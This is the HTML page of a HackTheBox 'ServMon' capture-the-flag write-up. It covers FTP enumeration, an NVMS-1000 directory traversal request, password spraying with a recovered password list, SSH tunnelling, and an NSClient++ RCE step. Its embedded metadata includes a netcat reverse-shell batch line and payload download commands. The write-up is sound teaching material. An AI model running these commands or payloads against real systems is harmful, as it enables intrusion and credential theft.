<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox - ServMon | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Exploiting embedded system software"><meta name=author content="Fahmi J"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-servmon-10-10-10-184-scratch-78c115a7597><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.ea57d503c53412df03df06f8ca649bf4c49bf00e8667d3f8ab1889cd12c573f3.css integrity="sha256-6lfVA8U0Et8D3wb4ymSb9MSb8A6GZ9P4qxiJzRLFc/M=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.85.0"><script>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g+"?ref=bwt",d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","711neo6qfi")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - ServMon"><meta property="og:description" content="Exploiting embedded system software"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-servmon/"><meta property="og:image" content="https://fahmifj.github.io/imgs/image-20210408043546009.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-04-06T23:09:46+07:00"><meta property="article:modified_time" content="2021-04-06T23:09:46+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/imgs/image-20210408043546009.png"><meta name=twitter:title content="HackTheBox - ServMon"><meta name=twitter:description content="Exploiting embedded system software"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - ServMon","item":"https://fahmifj.github.io/writeups/hackthebox/htb-servmon/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - ServMon","name":"HackTheBox - ServMon","description":"Exploiting embedded system software","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user’s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I’m able to gain a foothold on the system .\nIn the NSClient++ default installation folder, there is a config file which contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\\System.\nSkills Learned  Directory/Path Traversal NVMS-1000 exploitation NSClient-0.5.2.35 exploitation Port Forwarding/Tunneling  Tools  CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec BurpSuite - https://portswigger.net/burp NSClient-0.5.2.35 Exploit PoC - https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  Reconnaissance Nmap → root@iamf «servmon» «10.10.14.23» $ nmap -sC -sV -oA nmap/initial-servmon '10.10.10.184'  -sC, to scan with default script -sV, to scan service version -oA, to save the output in all format (xml, nmap, gnmap) -v, verbose mode.  PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM  Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | | |  |  | | window.location.href = \"Pages/login.htm\"; |  |  |  |  |  | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5666/tcp open tcpwrapped 6699/tcp open napster? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html |_ refox/68.0 | http-title: NSClient++ |_Requested resource was /index.html | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.80%I=7%D=4/12%Time=5E93410A%P=x86_64-pc-linux-gnu%r(NULL SF:,6B,\"HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/ht SF:ml\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n SF:\\r\\n\")%r(GetRequest,1B4,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20tex SF:t/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x .... Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -28s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-12T16:27:15 |_ start_date: N/A RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box.\nBesides these standard ports, there are some interesting services installed on the box:\n FTP with anonymous login on port 21, SSH service on port 22 HTTPS service on non-standard port 8443.  This machine probably is not an Active Directory.\nEnumeration TCP 21 - FTP ...... 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM  Users ...... Based on nmap scans, the FTP root directory contains the Users folder. Inside the Users folder, I found two subfolders, one is Nathan and the other is Nadine. Both of these users' folders contain a text file, I copied these files to my machine.\nThe first file is Confidential.txt. It contains a note from Nadine to Nathan.\nNathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine The second file is Notes to do.txt. It contains a to do list.\n1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint I’ll note that there’s a Password.txt text on Nathan’s desktop and the uncompleted to do.\nTCP 445 - SMB Anonymous login is not allowed, so nothing to see here.\nTCP 80 - Website Visiting port 80 redirects me to a login page on Pages/login.htm\nBased on Google, NVSMS-1000 is a software for CCTV monitoring. I don’t find the default credentials, and it doesn’t seem to work with common credentials.\nExploit-DB A quick search on exploit-db shows it is vulnerable to Directory Traversal.\n PoC: https://www.exploit-db.com/exploits/47774\n # Title: NVMS-1000 - Directory Traversal # Date: 2019-12-12 # Author: Numan Türle # Vendor Homepage: http://en.tvt.net.cn/ # Version : N/A # Software Link : http://en.tvt.net.cn/products/188.html POC --------- GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: 12.0.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close Response --------- ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 There’s no version is specified, but I’ll give it a try.\nTCP 8443 - NSClient++ Exploit-DB It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding ‘exploit’ to the keyword pops up an exploit link that refers to exploit-DB:\n Manual PoC: https://www.exploit-db.com/exploits/46802 Scripted PoC: https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  Foothold Shell as nadine  I’ve added htb.servmon to my /etc/hosts, so it will resolve to 10.10.10.184. I know htb.servmon looks weird, but that’s me in the past hehe..\n NVMS-1000 Directory Traversal - Obtain Passwords.txt I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000\nIt returns a list of passwords\nPassword spraying I created a usernames list and a password list:\n  users.txt\nnathan nadine   passwords.txt\n1nsp3ctTh3Way2Mars! Th3r34r3To0M4nyTrait0r5! B3WithM30r4ga1n5tMe L1k3B1gBut7s@W0rk 0nly7h3y0unGWi11F0l10w IfH3s4b0Utg0t0H1sH0me Gr4etN3w5w17hMySk1Pa5$   With these, a password spray can be performed using CrackMapExec. It hits on nadine:L1k3B1gBut7s@W0rk pair.\n→ root@iamf «servmon» «10.10.14.23» $ crackmapexec smb htb.servmon -u users -p passwords ...... SMB 10.10.10.184 445 SERVMON [+] SERVMON\\nadine:L1k3B1gBut7s@W0rk ...... SSH access The credentials also work on SSH.\n→ root@iamf «servmon» «10.10.14.23» $ ssh nadine@htb.servmon   Privilege Escalation Shell as NT Authority\\System Obtain NSClient++ password 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.\nPS C:\\ gc 'Program Files\\NSClient++\\nsclient.ini'   I’ll try the scripted PoC. But before that, I’ll need to tunnel the connection first. This is because the config file is set to local only, so I can’t perform exploit directly from outside.\nSSH Tunneling SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I’ll create another SSH connection for tunneling.\n→ root@iamf «servmon» «10.10.14.23» $ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 -L 8443:127.0.0.1:8443 means it will forward any connection on my localhost port 8443 to remote localhost on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.\nNSClient++ Exploit PoC First, I’ll create a batch, called sans.bat file on my machine.\n@echo off C:\\Temp\\nc.exe 10.10.14.23 443 -e powershell.exe Once it created, I’ll transfer the file to ServMon on C:\\temp\\ via python http server along with netcat for windows.\n→ root@iamf «servmon» «10.10.14.23» $ Python -m SimpleHTTPServer 80 Get the hosted files on ServMon\nPS C:\\ Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat PS C:\\ Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe Now I’ll setup a listener on my Kali.\n→ root@iamf «servmon» «10.10.14.23» $ nc -nlvvp 443 Then I can just run the exploit and wait on my listener.\n→ root@iamf «servmon» «10.10.14.23» $ python3 nsRCE.py -t 127.0.0.1 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c \"c:\\temp\\reverse.bat\" Now I have an interactive shell as NT Authority\\SYSTEM.\n References  https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  ","wordCount":"1241","inLanguage":"en","image":"https://fahmifj.github.io/imgs/image-20210408043546009.png","datePublished":"2021-04-06T23:09:46+07:00","dateModified":"2021-04-06T23:09:46+07:00","author":{"@type":"Person","name":"Fahmi J"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-servmon/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class="header sticky"><nav class=nav><div class=container><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="友人F (Alt + H)">友人F</a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://fahmifj.github.io/writeups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://fahmifj.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://fahmifj.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://fahmifj.github.io/about/ title=About><span>About</span></a></li></ul><span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/>Write-ups</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - ServMon</h1><div class=post-description>Exploiting embedded system software</div><div class=post-meta>April 6, 2021&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Fahmi J
<span class=post-canonical-link>Originally published at<a href=https://fahmifj.medium.com/hack-the-box-servmon-10-10-10-184-scratch-78c115a7597 target=_blank rel="noopener noreferrer"> fahmifj.medium.com</a></span></div></header><figure class=entry-cover><img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-servmon/imgs/image-20210408043546009_hu035e1bc885022e385fbca8a7f6ba0ea3_126995_360x0_resize_box_2.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-servmon/imgs/image-20210408043546009_hu035e1bc885022e385fbca8a7f6ba0ea3_126995_480x0_resize_box_2.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-servmon/imgs/image-20210408043546009_hu035e1bc885022e385fbca8a7f6ba0ea3_126995_720x0_resize_box_2.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-servmon/imgs/image-20210408043546009.png 743w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-servmon/imgs/image-20210408043546009.png alt="Hack The Box - ServMon"><p>HackTheBox - ServMon</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><ul><li><a href=#skills-learned aria-label="Skills Learned">Skills Learned</a></li><li><a href=#tools aria-label=Tools>Tools</a></li></ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-21---ftp aria-label="TCP 21 - FTP">TCP 21 - FTP</a></li><li><a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a><ul><li><a href=#exploit-db aria-label=Exploit-DB>Exploit-DB</a></li></ul></li><li><a href=#tcp-8443---nsclient aria-label="TCP 8443 - NSClient++">TCP 8443 - NSClient++</a><ul><li><a href=#exploit-db-1 aria-label=Exploit-DB>Exploit-DB</a></li></ul></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-nadine aria-label="Shell as nadine">Shell as nadine</a><ul><li><a href=#nvms-1000-directory-traversal---obtain-passwordstxt aria-label="NVMS-1000 Directory Traversal - Obtain Passwords.txt">NVMS-1000 Directory Traversal - Obtain Passwords.txt</a></li><li><a href=#password-spraying aria-label="Password spraying">Password spraying</a></li><li><a href=#ssh-access aria-label="SSH access">SSH access</a></li></ul></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-nt-authoritysystem aria-label="Shell as NT Authority\System">Shell as NT Authority\System</a><ul><li><a href=#obtain-nsclient-password aria-label="Obtain NSClient++ password">Obtain NSClient++ password</a></li><li><a href=#ssh-tunneling aria-label="SSH Tunneling">SSH Tunneling</a></li><li><a href=#nsclient-exploit-poc aria-label="NSClient++ Exploit PoC">NSClient++ Exploit PoC</a></li></ul></li></ul></li><li><a href=#references aria-label=References>References</a></li></ul></div></details></div><div class=post-content><p>ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user&rsquo;s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I&rsquo;m able to gain a foothold on the system .</p><p>In the NSClient++ default installation folder, there is a config file which contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\System.</p><h3 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h3><ul><li>Directory/Path Traversal</li><li>NVMS-1000 exploitation</li><li>NSClient-0.5.2.35 exploitation</li><li>Port Forwarding/Tunneling</li></ul><h3 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li>CrackMapExec - <a href=https://github.com/byt3bl33d3r/CrackMapExec>https://github.com/byt3bl33d3r/CrackMapExec</a></li><li>BurpSuite - <a href=https://portswigger.net/burp>https://portswigger.net/burp</a></li><li>NSClient-0.5.2.35 Exploit PoC - <a href=https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html>https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ nmap -sC -sV -oA nmap/initial-servmon <span class=s1>&#39;10.10.10.184&#39;</span>
</code></pre></div><ul><li><code>-sC</code>, to scan with default script</li><li><code>-sV</code>, to scan service version</li><li><code>-oA</code>, to save the output in all format (xml, nmap, gnmap)</li><li><code>-v</code>, verbose mode.</li></ul><div class=highlight><pre class=chroma><code class=language-text data-lang=text>PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     &lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;&gt;
|     &lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&gt;
|     &lt;head&gt;
|     &lt;title&gt;&lt;/title&gt;
|     &lt;script type=&#34;text/javascript&#34;&gt;
|     window.location.href = &#34;Pages/login.htm&#34;;
|     &lt;/script&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn&#39;t have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    refox/68.0
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/12%Time=5E93410A%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n&#34;)%r(GetRequest,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
....
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -28s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-12T16:27:15
|_  start_date: N/A
</code></pre></div><p>RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box.</p><p>Besides these standard ports, there are some interesting services installed on the box:</p><ul><li>FTP with anonymous login on port 21,</li><li>SSH service on port 22</li><li>HTTPS service on non-standard port 8443.</li></ul><p>This machine probably is not an Active Directory.</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-21---ftp>TCP 21 - FTP<a class=anchor aria-hidden=true href=#tcp-21---ftp>#</a></h3><pre><code>...&lt;SNIP&gt;...
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       &lt;DIR&gt;          Users
...&lt;SNIP&gt;...
</code></pre><p>Based on <code>nmap</code> scans, the FTP root directory contains the <code>Users</code> folder. Inside the <code>Users</code> folder, I found two subfolders, one is <code>Nathan</code> and the other is <code>Nadine</code>. Both of these users' folders contain a text file, I copied these files to my machine.</p><p>The first file is <code>Confidential.txt</code>. It contains a note from <code>Nadine</code> to <code>Nathan</code>.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
</code></pre></div><p>The second file is <code>Notes to do.txt</code>. It contains a to do list.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
</code></pre></div><p>I&rsquo;ll note that there&rsquo;s a <code>Password.txt</code> text on <code>Nathan</code>&rsquo;s desktop and the uncompleted to do.</p><h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3><p>Anonymous login is not allowed, so nothing to see here.</p><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting port 80 redirects me to a login page on <code>Pages/login.htm</code></p><p><img class=img-container src=imgs/image-20210406234719034.png alt=image-20210406234719034></p><p>Based on Google, NVSMS-1000 is a software for CCTV monitoring. I don&rsquo;t find the default credentials, and it doesn&rsquo;t seem to work with common credentials.</p><h4 id=exploit-db>Exploit-DB<a class=anchor aria-hidden=true href=#exploit-db>#</a></h4><p>A quick search on <code>exploit-db</code> shows it is vulnerable to Directory Traversal.</p><blockquote><p>PoC: <a href=https://www.exploit-db.com/exploits/47774>https://www.exploit-db.com/exploits/47774</a></p></blockquote><div class=highlight><pre class=chroma><code class=language-text data-lang=text># Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
</code></pre></div><p>There&rsquo;s no version is specified, but I&rsquo;ll give it a try.</p><h3 id=tcp-8443---nsclient>TCP 8443 - NSClient++<a class=anchor aria-hidden=true href=#tcp-8443---nsclient>#</a></h3><h4 id=exploit-db-1>Exploit-DB<a class=anchor aria-hidden=true href=#exploit-db-1>#</a></h4><p><img class=img-container src=imgs/image-20210407052822638.png alt=image-20210407052822638></p><p>It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding &lsquo;exploit&rsquo; to the keyword pops up an exploit link that refers to exploit-DB:</p><ul><li>Manual PoC: <a href=https://www.exploit-db.com/exploits/46802>https://www.exploit-db.com/exploits/46802</a></li><li>Scripted PoC: <a href=https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html>https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li></ul><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-nadine>Shell as nadine<a class=anchor aria-hidden=true href=#shell-as-nadine>#</a></h3><blockquote><p>I&rsquo;ve added <code>htb.servmon</code> to my <code>/etc/hosts</code>, so it will resolve to <code>10.10.10.184</code>. I know <code>htb.servmon</code> looks weird, but that&rsquo;s me in the past hehe..</p></blockquote><h4 id=nvms-1000-directory-traversal---obtain-passwordstxt>NVMS-1000 Directory Traversal - Obtain Passwords.txt<a class=anchor aria-hidden=true href=#nvms-1000-directory-traversal---obtain-passwordstxt>#</a></h4><p>I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000</p><p><img class=img-container src=imgs/image-20210406234225362.png alt=image-20210406234225362></p><p>It returns a list of passwords</p><p><img class=img-container src=imgs/image-20210406234232390.png alt=image-20210406234232390></p><h4 id=password-spraying>Password spraying<a class=anchor aria-hidden=true href=#password-spraying>#</a></h4><p>I created a usernames list and a password list:</p><ul><li><p><code>users.txt</code></p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>nathan
nadine
</code></pre></div></li><li><p><code>passwords.txt</code></p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
